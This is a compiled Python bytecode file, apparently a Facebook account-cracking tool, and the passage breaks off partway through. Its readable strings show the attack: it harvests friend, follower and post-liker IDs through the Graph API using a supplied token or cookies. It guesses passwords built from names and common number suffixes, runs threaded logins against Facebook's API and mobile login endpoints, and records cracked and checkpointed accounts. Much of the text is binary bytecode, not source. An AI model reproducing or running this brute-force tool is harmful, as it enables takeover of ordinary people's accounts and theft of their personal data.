o

    +ua� �                
   @   s&  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlmZ d dl
mZ d dlmZ d dlmZ d dlmZ d dlmZ dZd	Zd
ZdZdZd
ZdZdZdZg Zg Z g Z!e�"� Z#e#j$Z%e#j&Z'e#j(Z)ddddddddddddd�Z*g d�Z+ze'd k s�e'dkr�e,�  e'd Z-W n e.y�   e,�  Y nw e+e- Z/d e)e/e%f Z0d!Z1d"Z2d#Z3d$Z4d%Z5d&Z6d'Z7d(Z8d)d*� Z9d+d,� Z:d-d.� Z;d/d0� Z<d1d2� Z=d3d4� Z>d5d6� Z?d7d8� Z@d9d:� ZAd;d<� ZBd=d>� ZCd?d@� ZDdAdB� ZEdCdD� ZFdEdF� ZGdGdH� ZHdIdJ� ZIdKdL� ZJdMdN� ZKdOdP� ZLdQdR� ZMdSdT� ZNdUdV� ZOdWdX� ZPdYdZ� ZQG d[d\� d\�ZRd]d^� ZSd_d`� ZTdadb� ZUdcdd� ZVdedf� ZWdgdh� ZXdidj� ZYdkdl� ZZdmdn� Z[dodp� Z\dqdr� Z]dsdt� Z^zd dl Z e�_d.� W n e`�y~   eadu� ej�,�  Y nw ebdvk�r�e�_dw� e^�  e]�  dS dS )x�    N)�randint)�ThreadPoolExecutor)�
BeautifulSoup)�date)�datetime)�quotez[97;1mz[91;1mz[92;1mz[93;1mz[94;1mz[95;1mz[0m�https://mbasic.facebook.com�JANUARY�FEBRUARY�MARCH�APRIL�MAY�JUNE�JULY�AUGUST�	SEPTEMBER�OCTOBER�NOVEMBER�DECEMBER)�01�02�03�04�05�06�07�08�09�10�11�12)r	   r
   r   r   r
   r   r   r   r   r   r   r   �   �   z%s-%s-%sz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]z�Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]c                 C   �2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?��sys�stdout�write�flush�time�sleep��z�e� r/   �7/data/data/com.termux/files/home/code_obfuscate/cr3k.py�jalan9   �
   
�r1   c                 C   r#   )Nr$   g���Q��?r%   r,   r/   r/   r0   �mlaku>   r2   r3   c                   C   sF   dt j�� v rt�d� d S dt j�� v rt�d� d S t�d� d S )N�linux�clear�win�cls)r&   �platform�lower�os�systemr/   r/   r/   r0   r5   E   s   r5   c                   C   s    t �d� t �d� td� d S )Nr5   u�  echo  "

    ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓
   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒
   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░
   ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██ 
    ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒
    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░
     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░
     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   
         ░  ░  ░ ░     ░         ░   
             ░                       

╔═══════════════════════════════════════════╗
║  Author   : Mahmud Azim                   ║
║  Github   : https://github.com/Azim-Vau   ║           
║  Fb       : https://me.fb/AzimVau69       ║           
╚═══════════════════════════════════════════╝" | lolcat -a -d 2 -8� )r:   r;   �printr/   r/   r/   r0   �bannerL   s   

r>   c            
      C   s�  t �d� t�  t�  t�  tdttttf �} t	d� | dv r/t
dttttf � t�  d S | dv r�t
�  tdttttf �}z(t�d| �}t�|j�}|d	 }td
d�}|�|� |��  tt�� � W d S  ttfy�   t	d� t
dttttf � t �d� t�  Y d S  tjjy�   t	d� t
d
ttttf � t�  Y d S w | dv �r=t
�  tdttttf �}zBtjddddddddddd�	d|id�}t�d|j�}|d u r�dnd|�d � }	td
d�}|�|�d �� |��  tt�� � W d S  tjj�y   t	d� t
d
ttttf � t�  Y d S  ttt f�y<   t	d� t
d!ttttf � t �d� t�  Y d S w | d"v �rYt
d#ttttf � t �d� t�  t�  d S t
dttttf � t�  d S )$N�rm -rf token.txtu   %s  [%s•%s] %sCHOOSE  : r<   �r<   �!%s  [%s!%s] %sSELECT VALID OPTION��1r   �001�au   %s  [%s•%s] %sTOKEN : �+https://graph.facebook.com/me?access_token=�name�	token.txt�wz%s  [%s!%s] %sTOKEN INVALID� %s  [%s!%s] %sCONNECTION PROBLEM��2r   �002�bu   %s  [%s•%s] %sCOOKIES : zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comrC   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	�
user-agent�referer�host�origin�upgrade-insecure-requests�accept-language�
cache-control�accept�content-type�cookie)�headers�cookiesz	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r"   z%s  [%s!%s] %sINVALID COOKIES)�0�00�000r.   z(%s  [%s!%s] %sTHANKS FOR USING THIS TOOL)!r:   r;   r5   r>   �var_menu�input�H�P�Or=   r1   �M�menu_log�	defaultua�requests�get�json�loads�text�openr(   �close�exit�bot�main�KeyError�IOError�
exceptions�ConnectionError�re�search�group�AttributeError)
�pmu�token�x�y�n�xdr[   �data�
find_token�hasilr/   r/   r0   rg   R   s�   




�
���


�



rg   c               	   C   s�  t �  t�  z$d} d}d}tdd��� }t�d| �}t�|j�}|d }|d }W nT t	t
fyW   tdtt
tt
f � tdt � td	tt
tt
f � t�d
� t�  Y n( tjjy~   tdtt
tt
f � tdt � tdtt
tt
f � t�  Y nw tjdd
ddd�d��� }z|d }	W n t	y�   d}	Y nw tdttt|tf � td� tdtt
ttt|f � tdtt
ttt|	f � td� t�d� tdtt
ttf � tdtt
ttf �}
td� |
dv r�tdtt
tt
f � t�  d S |
dv �rt�  d S |
dv �r
t�  d S |
dv �rt�  d S |
dv �r!t�  d S |
d v �r+t�  d S |
d!v �r5t �  d S |
d"v �r?t!�  d S |
d#v �rIt"�  d S |
d$v �rbtd%tt
ttf � t�d
� t�  d S tdtt
tt
f � t�  d S )&Nr<   rH   �rrF   rG   �idz%s  [ %sOopc... :( %s]%s�%s  �#%s  [%s!%s] %sINVALID TOKEN/COOKIESr?   rJ   zhttp://ip-api.com/json/zhttp://ip-api.com/zapplication/json; charset=utf-8z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;])�RefererzContent-Typez
User-Agent�r\   �query� z%s 	  [ %sHELLO :) %s %s %s]u   %s  [%s•%s] %sID : %s[%s]u   %s  [%s•%s] %sIP : %s[%s]a  echo "  [1] CRACK FROM FRIEND/PUBLIC ID
  [2] CRACK FROM FOLLOWER
  [3] CRACK FROM PUBLIC POST LIKES
  [4] DUMP TARGET ID INFORMATION
  [5] COLLECT ID FOR CRACK FROM PUBLIC ID
  [6] CHECK CRACK RESULT
  [7] CHECK CRACK RESULT OPTIONS
  [8] USER AGENT" | lolcat -a -d 2z%s  [%s0%s] %sLOG OUT�   %s  [%s•%s] %sCHOOSE : r@   rA   rB   rK   ��3r   �003�c��4r   �004�d��5r   �005r.   )�6r   �006�f)�7r   �007�g)�8r   �008�h)r^   r_   r`   �jz%s  [%s!%s] %sSEE YOU LATER)#r5   r>   rn   �readri   rj   rk   rl   rm   rs   rt   r=   rf   rd   r1   r:   r;   rg   ru   rv   rp   re   �Brc   �Krb   �menu�publik�pengikut�likers�target�teman_targetr�   �	cek_hasil�ugen)�jid�pro�upgrader|   r}   r~   r   �irE   �ip�pmr/   r/   r0   r�   �   s~   


��





















r�   c               	   C   sF   t } ztdd�}|�| � |��  W d S  ttfy"   t�  Y d S w )N�	ugent.txtrI   )�ua_nokiarn   r(   ro   rs   rt   rg   )�ua�ugentr/   r/   r0   rh   �   s   

�rh   c               	   C   sV  t �  tdttttf �} td� | dv r$tdttttf � t�  d S | dv r<t	�
d� tdttttf � t�  d S | dv r�t	�
d	� td
ttttf �}z+tdd�}|�|� |�
�  td
tttf � td� tdttttf � t�  W d S  ttfy�   tdtttf � tdt � tdttttf � t�  Y d S w | dv r�t�  d S | dv r�t	�
d	� tdtttf � td� tdttttf � t�  d S | dv �rz	tdd��� }W n
 ttfy�   d}Y nw tdttttt|f � tdtttf � td� tdttttf � t�  d S | dv �rt�  d S tdttttf � d S )Nr�   r<   r@   rA   rB   z�xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8�%s   [ %sBACK %s]%srK   �rm -rf ugent.txtu%   %s  [%s•%s] %sENTER USER AGENT : 

r�   rI   z,
%s  [ %sSUCCESSFULLY CHANGED USER AGENT %s]z(
%s  [ %sFAILED TO CHANGE USER AGENT %s]r�   r�   r�   z+%s  [ %sUSER AGENT DELETED SUCCESSFULLY %s]r�   r�   zTidak Ditemukanu)   %s  [%s•%s] %sYOUR USER AGENT  : 

%s%sz,
%s  [ %sTHIS IS YOUR CURRENT USER AGENT %s])r^   r_   r`   r�   )�var_ugenrb   rc   rd   re   r=   r1   rf   r�   r:   r;   rn   r(   ro   rs   rt   �ugen_hpr�   )r{   r�   r�   �ungserr/   r/   r0   r�   �   sb   





�



�


r�   c                  C   sn  t �d� tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � td	ttttf � td
ttttf �} td� | dv rutd
ttttf � t	�  n�| dv r�t
dd�}|�t� |�
�  n�| dv r�t
dd�}|�t� |�
�  n�| dv r�t
dd�}|�t� |�
�  nm| dv r�t
dd�}|�t� |�
�  nZ| dv r�t
dd�}|�t� |�
�  nG| dv r�t
dd�}|�t� |�
�  n4| dv r�t
dd�}|�t� |�
�  n!| dv �rt
dd�}|�t� |�
�  n
td
ttttf � t	�  tdtttf � td� tdttttf � t	�  d S )Nr�   z%s  [%s1%s] %sXIAOMIz%s  [%s2%s] %sNOKIAz%s  [%s3%s] %sASUSz%s  [%s4%s] %sHUAWEIz%s  [%s5%s] %sVIVOz%s  [%s6%s] %sOPPOz%s  [%s7%s] %sSAMSUNGz%s  [%s8%s] %sWINDOWSr�   r<   r@   rA   �rC   r   r�   rI   �rL   r   �r�   r   �r�   r   )r�   r   )r�   r   )r�   r   )r�   r   z+%s  [ %sSUCCESSFULLY CHANGED USER AGENT %s]r�   )r:   r;   r=   rc   rd   re   rb   r1   rf   r�   rn   r(   �	ua_xiaomiro   r�   �ua_asus�	ua_huawei�ua_vivo�ua_oppo�
ua_samsung�
ua_windows)�pcr�   r/   r/   r0   r�     sB   
$

r�   c               
   C   �8  zd} t dd��� }t�d| �}t�|j�}|d }W n4 ttfy9   t	dt
tt
tf � t�
d� t�  Y n tjjyP   t	dt
tt
tf � t�  Y nw z�td	ttttf � td
ttttf �}z t�d| d | �}t�|j�}td
tttt|d f � W n ttfy�   td� t	dt
tt
tf � t�  Y nw t�d|| |f �}g }	t�|j�}
|d d �dd�}t |d�}|
d D ]}
|	�|
d d |
d  � |�|
d d |
d  d � q�|��  tdttttt|	�f � t|�W S  t�y } ztdt
tt
t|f � W Y d }~d S d }~ww )N�5000rH   r�   rF   rG   r�   r?   rJ   u5   %s  [%s•%s] %sWRITE 'me' FOR CRACK FROM YOUR OWN ID�   %s  [%s•%s] %sTARGET ID : �https://graph.facebook.com/�?access_token=�   %s  [%s•%s] %sNAME : %sr<   �%s  [%s!%s] %sID NOT FOUND�>https://graph.facebook.com/%s/friends?limit=%s&access_token=%s�
first_name�.jsonr�   �_rI   r�   r�   �   •r$   �   %s  [%s•%s] %sTOTAL ID : %s�%s  [%s!%s] %sERROR : %s�rn   r�   ri   rj   rk   rl   rm   rs   rt   r1   rf   rd   r:   r;   rg   ru   rv   rp   r=   rc   re   rb   r�   �replace�appendr(   ro   �len�crack�	Exception�r�   r|   r}   r~   r   �it�pb�obr�   r�   r-   �xc�xbrE   r.   r/   r/   r0   r�   A  �R   


�
�
 
$��r�   c               
   C   r�   )N�10000rH   r�   rF   rG   r�   r?   rJ   �/   %s  [%s•%s] %sWRITE 'me' FOR TAKING FRIEND IDr�   r�   r�   r�   r<   r�   zBhttps://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sr�   r�   r�   r�   rI   r�   r�   r�   r$   r�   r�   r�   r�   r/   r/   r0   r�   g  r�   r�   c               
   C   r�   )Nr�   rH   r�   rF   rG   r�   r?   rJ   r�   r�   r�   r�   r�   r<   r�   z<https://graph.facebook.com/%s/likes?limit=%s&access_token=%sr�   r�   r�   r�   rI   r�   r�   r�   r$   r�   r�   r�   r�   r/   r/   r0   r�   �  r�   r�   c                 C   s�   g }| � d�D ]H}t|�dk rq|�� }t|�dks&t|�dks&t|�dkr5|�|d � |�|d � qt|�dkrO|�|� |�|d � |�|d � qq|�| �� � |S )Nr�   �   �   �   �123�12345�   ��splitr�   r9   r�   ��_cici_�	_azimvau_r�   r/   r/   r0   �	generate1�  s   $
r�   c                 C   s�   g }| � d�D ]A}t|�dk rq|�� }t|�dks&t|�dks&t|�dkr5|�|d � |�|d � q|�|� |�|d � |�|d � q|�| �� � |�d� |�d� |�d	� |S )
Nr�   r�   r�   r�   r�   r�   �123456�	123456789�
1234567890r�   r�   r/   r/   r0   �	generate2�  s    $



r�   c                 C   s�   g }| � d�D ]A}t|�dk rq|�� }t|�dks&t|�dks&t|�dkr5|�|d � |�|d � q|�|� |�|d � |�|d � q|�| �� � |�d� |�d� |�d	� |�d
� |�d� |�d� |S )
Nr�   r�   r�   r�   r�   r�   z1234@#r�   �786786�12345678r�   �102030r�   r�   r/   r/   r0   �	generate3�  s&   $






r�   c                 C   s$  g }t dd��� }t dd��� }| �d�D ]A}|�� }t|�dk r"qt|�dks4t|�dks4t|�dkrC|�|d � |�|d	 � q|�|� |�|d � |�|d	 � q|d
v r\n| �d�D ]}|�� }|�d�D ]	}|�|| � qlqa|d
v r|n
|�d�D ]}|�|� q�|�| �� � |S )N�pass.txtr�   �numberpass.txtr�   r�   r�   r�   r�   r�   )r<   r�   z  �,)rn   r�   r�   r9   r�   r�   )r�   r�   �ps�ppr�   r}   r-   r/   r/   r0   �	generate4�  s.   $

�
r�   c                  C   sN   t d� t dttttf � tdttttf �} tdd�}|�| � |j d S )Nr<   u;   %s  [%s•%s] %sEXAMPLE : bangladesh,iloveyou,123456,786786u    %s  [%s•%s] %sADD PASSWORDS : r�   rI   �r=   rc   rd   re   rb   rn   r(   ro   )�cuy�ghr/   r/   r0   �tambah_pass
  s   


r  c                  C   sF   t dttttf � tdttttf �} tdd�}|�| � |j d S )Nu/   %s  [%s•%s] %sEXAMPLE : 123,1234,123@#,gamingu+   %s  [%s•%s] %sADD PASSWORD BEHIND NAME : r�   rI   r�   )�coy�xyr/   r/   r0   �tambah_pass_angka  s
   


r  c           	   
   C   s�   t dd��� }t�� }tt�dd��tt�dd��tt�dd��dd|d	d
d�}dd
d| d|dddd�	}d}|j|||d�}d|jv rNd|jv rNd| |d�S d|�	� d v r\d| |d�S d| |d�S )Nr�   r�   g    �sAg    8�|Ai N  i@�  �	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPA�!application/x-www-form-urlencoded�Liger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typerR   rZ   zx-fb-http-enginez/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32rk   rL   �en_US�iosrC   � 3f555f99fb61fcd7aa0c44f58f522ef6)	�access_token�format�sdk_version�email�locale�password�sdk�generate_session_cookies�sigz,https://b-api.facebook.com/method/auth.login)�paramsr\   �session_key�EAAA�success��statusr  �passzwww.facebook.com�	error_msg�cp�error)
rn   r�   ri   �Session�str�randomr   rj   rm   rk   )	�em�pas�hostsr�   r�   �header�param�api�responser/   r/   r0   �log_api  s8   ��	r)  c                 C   �  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d
|j	��}i }|d�D ]?}	|	�d�d u rh|	�d�dkrN|�d| i� q6|	�d�dkr]|�d|i� q6|�|	�d�di� q6|�|	�d�|	�d�i� q6|�|dddddddd�� |j�ddi� |j
d|d�j	}
dt|j�� �� �v r�d| ||j�� d�S dt|j�� �� �v r�d| ||j�� d�S d| |d �S )!Nr�   r�   �mbasic.facebook.comrP   rC   rQ   �
gzip, deflaterO   ��HostrX   rV   rR   rY   �accept-encodingrW   zhttps://mbasic.facebook.com/�html.parserr<   �dtsg":\{"token":"(.*?)"rb   �valuerG   r  r  r^   r�   ��fb_dtsg�m_sess�__user�__req�__csr�__a�__dyn�encpassrS   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100�r�   �c_userr  �r  r  r  r]   �
checkpointr  r  r  �rn   r�   ri   r  r\   �updaterj   �bs4r   rm   �joinrw   �findall�post�listr]   �get_dict�keys�r"  r#  r$  r�   r�   �prN   �metar�   r�   �por/   r/   r0   �
log_mbasic4  �6   

��rM  c                 C   r*  )!Nr�   r�   zfree.facebook.comrP   rC   rQ   r,  rO   r-  zhttps://free.facebook.com/r0  r<   r1  rb   r2  rG   r  r  r^   r�   r3  rS   z8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8z|https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r<  r=  r  r>  r?  r  r  r  r@  rI  r/   r/   r0   �log_freeR  rN  rO  c                 C   s*  d}d}t �� }|j�ddd|d|ddd	d
dd|d
 ddd�� i }t|j|d
 d|id�jd�}|�dddi�}g d�}	|�d�D ]}
|
�d�|	v rY|�|
�d�|
�d�i� qBqB|�| |d�� zt|j	||�d� |dd�jd�}W n t j
jy�   td� Y nw d |j
v r�d!| |d"�S d#|j
v �r	|�d�}|�ddd$i�d }
|�ddd%i�d }|�ddd&i�d }|
|
||d'd(|d)�}t|j	||d  |d*�jd�}d+d,� |�d-�D �}g }g }tt|��D ]}|�d.t t|d/ � d0 ||  d1 � q�t|d'�|� � d S d2t|�v �rd S 	 d S )3Nz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36r   r+  rP   rC   r  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�navigate�?1�document�/login/?next&ref=dbl&fl&refid=8r,  rO   �r.  rX   rV   rU   rZ   rR   rY   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destrS   r/  rW   rR   r�   r0  �form�methodrE  ��lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�login�bi_xrwhrb   rG   r2  �r  r  �actionT�r�   �allow_redirectsz[!] Redirect Overloadr=  r  r  r?  r4  r\  �nhr<   �	Lanjutkan�r4  r4  r\  r\  �checkpoint_datazsubmit[Continue]rg  r<  c                 S   �   g | ]}|j �qS r/   �rm   ��.0�yyr/   r/   r0   �
<listcomp>�  �    zcek_log.<locals>.<listcomp>�optionz
     r"   �. r�   �login_error)ri   r  r\   rA  �parrj   rm   �find�find_allrE  ru   �TooManyRedirectsr=   r]   �ranger�   r�   rd   r   rC  )�user�pasw�h_cpr�   �mb�sesr�   �ged�fmrF  r�   �runrX  �dtsg�jzstrg  �dataD�xnxx�ngew�opsi�
option_dev�optr/   r/   r0   �cek_logp  sv   �&�

�	,r�  c                 C   s�   g }t | �� �D ]/}|d t| �� �d kr&|�|d d | |d   � q|�|d d | |d   d � qd�|�}|�dd�}|�d�}d|d	 |d |d |d
 |d f }|S )Nr   r"   �=z; r<   r�   �;z%s; %s; %s; %s; %sr�   r�   r�   )�	enumeraterH  r�   r�   rC  r�   r�   )r]   �resultr�   �sample�sam_�samp_�finalr/   r/   r0   �koki�  s   8$

&r�  c                 C   s�   g }t �� }d}|j|d|id�}t|jd�}|jddd�}|�d�D ]}z|�d	�j}	|�d
|	 � W q#   Y q#d}
|j|
d|id�}t|jd�}|jddd�}|�d�D ]}z|�d	�j}	|�d
|	 � W qW   Y qWt	| d�
|� � d S )
Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer[   )r]   r0  rX  rE  )rY  �h3�spanu   
   • z>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactiver<   )ri   r  rj   ru  �contentrv  rw  rm   r�   r=   rC  )�h_okr�   �apk�ses_�url�dat_game�datagame�form_�asu�celeng�url2r/   r/   r0   �cek_apk�  s*   

r�  c                 C   s�  t | �dkr�| d d� dv rd}|S | d d� dv rd}|S | d d� dv r*d}|S | d d	� d
v r6d}|S | d d	� dv rBd}|S | d d
� dv rNd}|S | d d
� dv rZd}|S | d d
� dv rfd}|S | d d
� dv rrd}|S | d d
� dv r~d}|S | d d
� dv r�d}|S | d d� dv r�d}|S | d d� dv r�d}|S | d d� dv r�d }|S | d d� d!v r�d"}|S | d d� d#v r�d$}|S | d d� d%v r�d&}|S d'}|S t | �d(v r�d)}|S t | �dkr�d*}|S t | �d	kr�d+}|S d'}|S ),N�   �
   )�
1000000000u	    • 2009�	   )�	100000000�   )�10000000�   )�1000000�1000001�1000002�1000003�1000004�1000005)�1000006�1000007�1000008�1000009u	    • 2010r�   )�100001u    • 2010/2011)�100002�100003u    • 2011/2012)�100004u    • 2012/2013)�100005�100006u    • 2013/2014)�100007�100008u    • 2014/2015)�100009u	    • 2015r�   )�10001u    • 2015/2016)�10002u    • 2016/2017)�10003u	    • 2018)�10004u	    • 2019)�10005u	    • 2020)�10006�10007�10008u	    • 2021r<   )r�  r�  u    • 2008/2009u    • 2007/2008u    • 2006/2007)r�   )�fx�bochorr/   r/   r0   �tahun�  s`   ������������
���
�	�����r�  c                   @   sL   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zd
d� Z	dd� Z
dS )r�   c              
   C   s  g | _ g | _d| _td� tdttttf � 	 tdttttf �}|dkr5tdt	tt	tf � t
�  �nK|dv r�zH	 z|| _t| j��
� �� | _W qc tyb } ztd| � W Y d }~q:d }~ww g | _| jD ]}z| j�d	|�d
�d i� W qi   Y qiW n ty� } ztd| � W Y d }~qd }~ww tdttttf � | ��  d S |dv �r��z�	 z|| _t| j��
� �� | _W q� ty� } ztd| � W Y d }~q�d }~ww g | _t�  tdttttf �}|d
v r�tdt	tt	tf � t
�  n�|dv �r%| jD ]�}z| j�|�d
�d t|�d
�d �d�� W �q   Y �q|dv �rN| jD ]�}z| j�|�d
�d t|�d
�d �d�� W �q-   Y �q-|dv �rw| jD ]f}z| j�|�d
�d t|�d
�d �d�� W �qV   Y �qV|dv �r�t�d� t�d� t�  t�  | jD ]-}z| j�|�d
�d t|�d
�d �d�� W �q�   Y �q�tdt	tt	tf � t
�  t�  tdttttf �}td� |d
v �r�tdt	tt	tf � t
�  �n�|dv �r`tdttttf � tdttttf �}|d
v �rtdt	tt	tf � t
�  �nV|dv �r0t�  t �  t!d��"| j#| j� t�$| j� t%�  W d S |dv �rQt�  t �  t!d��"| j&| j� t�$| j� t%�  W d S tdt	tt	tf � t
�  �n|dv �r�tdttttf � tdttttf �}|d
v �r�tdt	tt	tf � t
�  n�|dv �r�t�  t �  t!d��"| j'| j� t�$| j� t%�  W d S |dv �r�t�  t �  t!d��"| j(| j� t�$| j� t%�  W d S tdt	tt	tf � t
�  n�|dv �rXtdttttf � tdttttf �}|d
v �rtdt	tt	tf � t
�  n]|dv �r)t�  t �  t!d��"| j)| j� t�$| j� t%�  W d S |dv �rJt�  t �  t!d��"| j*| j� t�$| j� t%�  W d S tdt	tt	tf � t
�  n
tdt	tt	tf � t
�  W n t�y } ztd| � W Y d }~nd }~ww q)Nr   r<   u4   %s  [%s•%s] %sCRACK WITH DEFAULT/MANUAL PASS [d/m]Tr�   rA   )�mrf   rL   r   rM   z   %sr�   r�   u1   %s  [%s•%s] %sEXAMPLE : 123456,1234567,12345678)r�   �DrC   r   rD   r@   r�   r"   )r�   �pwr�   r�   r�   zrm -rf pass.txtzrm -rf numberpass.txtrB   �(   %s  [%s•%s] %sPOP UP CP OPTIONS? [y/t]�rC   r   rD   r~   �Y�#   �rL   r   rM   �t�TrK   r�   )+�adar  �kor=   rc   rd   re   rb   r1   rf   r�   r�  rn   r�   �
splitlines�fsr�   �flr�   r�   �pwlist�start_methodezzr�   r�   r�   r:   r;   r  r  r�   �start_methodr>   �started�
ThreadPool�map�api_opsi�removerp   r'  �mbasic_opsi�mbasic�	free_opsi�free)�self�filesr�   r.   r�   �kopi�put�pufr/   r/   r0   �__init__�  sB  
��

���
��

0

0

0



0















��� ��zcrack.__init__c                 C   s�  t dttttf ��d�| _t| j�dkr| ��  d S | jD ]
}|�	d| ji� qt
�  t dttttf �}td� |dv rMtdt
tt
tf � t�  d S |d	v r�td
ttttf � t dttttf �}|dv rxtdt
tt
tf � t�  d S |dv r�t�  t�  td��| j| j� t�| j� t�  d S |d
v r�t�  t�  td��| j| j� t�| j� t�  d S tdt
tt
tf � t�  d S |dv �r@td
ttttf � t dttttf �}|dv r�tdt
tt
tf � t�  d S |dv �rt�  t�  td��| j| j� t�| j� t�  d S |d
v �r1t�  t�  td��| j| j� t�| j� t�  d S tdt
tt
tf � t�  d S |dv �r�tdttttf � t dttttf �}|dv �rmtdt
tt
tf � t�  d S |dv �r�t�  t�  td��| j| j� t�| j� t�  d S |d
v �r�t�  t�  td��| j| j� t�| j� t�  d S tdt
tt
tf � t�  d S tdt
tt
tf � t�  d S )Nu!   %s  [%s•%s] %sENTER PASSWORD : r�   r   r�  r�   r<   r@   rA   rB   u'   %s  [%s•%s] %sPOP UP CP OPTIONS [y/t]r�  �   r�  rK   r�   r�  )rb   rc   rd   re   r�   r�  r�   r�  r�  rA  r�  r=   r1   rf   r�   r>   r�  r�  r�  r�  r:   r�  r�  rp   r'  r�  r�  r�  r�  )r�  r�   r�  r�  r/   r/   r0   r�  �  s�   





















zcrack.pwlistc           
      C   s�  �z7|� d�D �]}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t
|� d��f	 � | j�d
|� d�||||	f � tdt d��d|� d�||||	f � W  �q
 ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t
|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q
|� d�dk�r	t
dttt|� d�|t
|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q
q|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nr�  r�   �https://b-api.facebook.comr  r  r�   r�   rH   r�   �birthday�/�$   
%s[%sCP%s] %s • %s • %s %s %s%s�   %s•%s•%s%s%s�	CP/%s.txt�a+�   %s•%s•%s%s%s
r�   �   
%s[%sCP%s] %s • %s%s     �   %s•%s�   %s•%s
r  �   
%s[%sOK%s] %s • %s%s     �	OK/%s.txtr"   �1
%s[%sCRACK%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s��end)rj   r)  ri   rn   r�   rk   rl   rm   r�   �	bulan_ttlr=   re   rd   r�  r  r�   �tarikhr(   rs   rt   rc   r�  r�  r�   r�  r&   r'   r)   r'  �
